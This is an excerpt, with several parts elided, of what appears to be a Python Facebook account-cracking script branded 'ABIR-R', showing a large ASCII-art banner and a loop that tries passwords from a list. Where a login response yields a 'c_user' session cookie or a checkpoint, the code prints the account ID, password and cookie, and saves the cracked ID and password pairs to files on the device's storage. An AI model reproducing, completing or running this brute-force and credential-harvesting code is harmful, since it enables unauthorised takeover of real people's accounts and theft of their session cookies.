...
logo = (""""\033[132m
AAA               BBBBBBBBBBBBBBBBB   IIIIIIIIIIRRRRRRRRRRRRRRRRR                    RRRRRRRRRRRRRRRRR   
              A:::A              B::::::::::::::::B  I::::::::IR::::::::::::::::R                   R::::::::::::::::R  
             A:::::A             B::::::BBBBBB:::::B I::::::::IR::::::RRRRRR:::::R                  R::::::RRRRRR:::::R 
            A:::::::A            BB:::::B     B:::::BII::::::IIRR:::::R     R:::::R                 RR:::::R     R:::::R
           A:::::::::A             B::::B     B:::::B  I::::I    R::::R     R:::::R                   R::::R     R:::::R
          A:::::A:::::A            B::::B     B:::::B  I::::I    R::::R     R:::::R                   R::::R     R:::::R
         A:::::A A:::::A           B::::BBBBBB:::::B   I::::I    R::::RRRRRR:::::R                    R::::RRRRRR:::::R 
        A:::::A   A:::::A          B:::::::::::::BB    I::::I    R:::::::::::::RR   ---------------   R:::::::::::::RR  
       A:::::A     A:::::A         B::::BBBBBB:::::B   I::::I    R::::RRRRRR:::::R  -:::::::::::::-   R::::RRRRRR:::::R 
      A:::::AAAAAAAAA:::::A        B::::B     B:::::B  I::::I    R::::R     R:::::R ---------------   R::::R     R:::::R
     A:::::::::::::::::::::A       B::::B     B:::::B  I::::I    R::::R     R:::::R                   R::::R     R:::::R
    A:::::AAAAAAAAAAAAA:::::A      B::::B     B:::::B  I::::I    R::::R     R:::::R                   R::::R     R:::::R
   A:::::A             A:::::A   BB:::::BBBBBB::::::BII::::::IIRR:::::R     R:::::R                 RR:::::R     R:::::R
  A:::::A               A:::::A  B:::::::::::::::::B I::::::::IR::::::R     R:::::R                 R::::::R     R:::::R
 A:::::A                 A:::::A B::::::::::::::::B  I::::::::IR::::::R     R:::::R                 R::::::R     R:::::R
AAAAAAA                   AAAAAAABBBBBBBBBBBBBBBBB   IIIIIIIIIIRRRRRRRR     RRRRRRR                 RRRRRRRR     RRRRRRR
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[ABIR-R-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ABIR-R-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[ABIR-R-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ABIR-R-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[ABIR-R] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
